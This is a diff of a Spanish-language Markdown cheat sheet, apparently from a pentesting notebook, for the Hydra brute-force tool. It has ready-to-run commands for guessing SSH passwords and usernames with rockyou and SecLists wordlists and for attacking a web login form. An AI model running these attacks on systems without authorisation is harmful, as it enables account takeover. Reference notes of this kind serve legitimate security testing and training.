@@ -1,32 +1,62 @@
-#Linux #Fuerza-bruta
-![[Hydra.png]]
+# Hydra
 
+Hydra es una herramienta de fuerza bruta para servicios de autenticación en red. Soporta SSH, FTP, HTTP, SMB, RDP, MySQL y decenas de protocolos más.
 
---- 
-## Utilidad
+---
 
-Sacar la contraseña 
+## Sintaxis general
 
-```
-hydra -l usuario -P [ruta diccionario] ssh
-```
-
-
-Sacar el usuario
-
-```
-hydra -L [ruta diccionario] -p contraseña ssh
+```bash
+hydra -l <usuario> -P <diccionario> <protocolo>://<objetivo>
 ```
 
+---
 
-Fuerza bruta a una web
+## Casos de uso
 
+### Fuerza bruta SSH — usuario conocido
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
 ```
-hydra -f -l usuario -P diccionario.txt http-post-form://example.com/login.php:username=^USER^&password=^PASS^ errfile=hydra.log
+
+### Fuerza bruta SSH — encontrar usuario
+
+```bash
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p Password123 ssh://192.168.1.10
 ```
 
+### Fuerza bruta formulario web (POST)
 
-## Parámetros a tener en cuenta
+```bash
+hydra -l admin -P rockyou.txt 192.168.1.10 \
+  http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
+```
 
-- -f
-	- Termina la ejecución del comando si encuentra una posible clave válida.
+El formato de `http-post-form` es: `"ruta:parámetros:mensaje_de_error"`
+
+- `^USER^` — placeholder para el usuario
+- `^PASS^` — placeholder para la contraseña
+- El tercer campo es la cadena que aparece en la respuesta cuando el login falla
+
+---
+
+## Parámetros útiles
+
+| Flag | Descripción |
+|---|---|
+| `-l` | Usuario fijo |
+| `-L` | Lista de usuarios |
+| `-p` | Contraseña fija |
+| `-P` | Lista de contraseñas |
+| `-f` | Para al encontrar la primera credencial válida |
+| `-t` | Número de tareas paralelas (hilos), por defecto 16 |
+| `-s` | Puerto alternativo |
+| `-v` | Modo verbose |
+
+---
+
+## Referencias
+
+- [SecLists](https://github.com/danielmiessler/SecLists) — Diccionarios de usuarios y contraseñas
+- [Diccionarios personalizados](diccionarios-personalizados.md) — Generar listas específicas para el objetivo
